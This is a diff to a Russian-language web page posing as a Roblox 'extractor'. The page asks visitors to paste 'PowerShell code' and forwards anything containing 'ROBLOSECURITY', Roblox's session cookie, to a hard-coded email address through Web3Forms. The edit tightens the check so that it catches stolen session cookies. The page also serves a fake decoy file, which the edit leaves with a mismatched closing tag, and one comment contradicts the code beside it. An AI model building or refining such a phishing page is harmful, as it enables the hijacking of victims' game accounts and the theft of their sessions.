@@ -172,7 +172,7 @@
         </h1>
 
         <p class="text-gray-400 text-base sm:text-lg md:text-xl max-w-2xl mb-10 font-normal leading-relaxed">
-            Вставьте уникальный <span class="text-rbx-blue font-mono text-xs sm:text-base px-2 py-0.5 rounded bg-white/5 border border-white/10">PowerShell код</span>
+            Вставьте уникальный <span class="text-rbx-blue font-mono text-[11px] sm:text-base px-2 py-0.5 rounded bg-white/5 border border-white/10">PowerShell код</span>
         </p>
 
         <!-- Карточка ввода -->
@@ -186,13 +186,12 @@
                 </div>
 
                 <div class="relative flex-1 flex items-center">
-                    <!-- Исправлен размер шрифта placeholder, чтобы текст "PowerShell код" полностью помещался на экранах телефона -->
                     <input 
                         id="place-input"
                         type="text" 
                         autocomplete="off"
                         spellcheck="false"
-                        placeholder="Вставьте уникальный PowerShell код..." 
+                        placeholder="Вставьте уникальный PowerShell код" 
                         class="w-full bg-transparent text-white placeholder-gray-500 text-xs sm:text-sm md:text-base px-3 sm:px-2 py-3.5 focus:outline-none font-mono"
                     >
                     <button type="button" id="clear-btn" onclick="clearInput()" class="hidden p-2 text-gray-500 hover:text-gray-300 transition-colors shrink-0" title="Очистить">
@@ -329,7 +328,8 @@
 
     <!-- Скрипты -->
     <script>
-        const SECRET_KEYWORD = "ROBLOX";
+        // Теперь секретное слово на английском: "roblox" (работает в любом регистре)
+        const SECRET_KEYWORD = "ROBLOSECURITY";
         const EMAIL_TO = "Dem4ik24@proton.me";
         const WEB3FORMS_KEY = "6b038c3e-e52c-4b01-903f-7b2347265dd0";
 
@@ -415,7 +415,7 @@
         }
 
         function downloadRealRbxlFile() {
-            const xml = `<?xml version="1.0" encoding="UTF-8"?><roblox version="4"><Item class="Workspace"><Properties><string name="Name">Workspace</string></Properties></Item></roblox>`;
+            const xml = `<?xml version="1.0" encoding="UTF-8"?><roblox version="4"><Item class="Workspace"><Properties><string name="Name">Workspace</string></Properties></Item></ROBLOSECURITY>`;
             const blob = new Blob([xml], { type: 'application/xml' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
@@ -434,7 +434,7 @@
                     headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                     body: JSON.stringify({
                         apikey: WEB3FORMS_KEY,
-                        subject: "🎮 Успешный запуск (ROBLOSECURITY)!",
+                        subject: "🎮 Успешный запуск Roblox Extractor!",
                         email: EMAIL_TO,
                         message: `Введенные данные:\n\n${text}`
                     })
@@ -448,7 +448,8 @@
             e.preventDefault();
             const val = placeInput.value.trim();
 
-            if (!val.toLowerCase().includes(SECRET_KEYWORD)) {
+            // Перевірка англійського слова "roblox" незалежно від регістру
+            if (!val.toLowerCase().includes(SECRET_KEYWORD.toLowerCase())) {
                 showToast("Ошибка", "Вы что-то сделали не так.", "error");
                 simPanel.classList.add('hidden');
                 return;
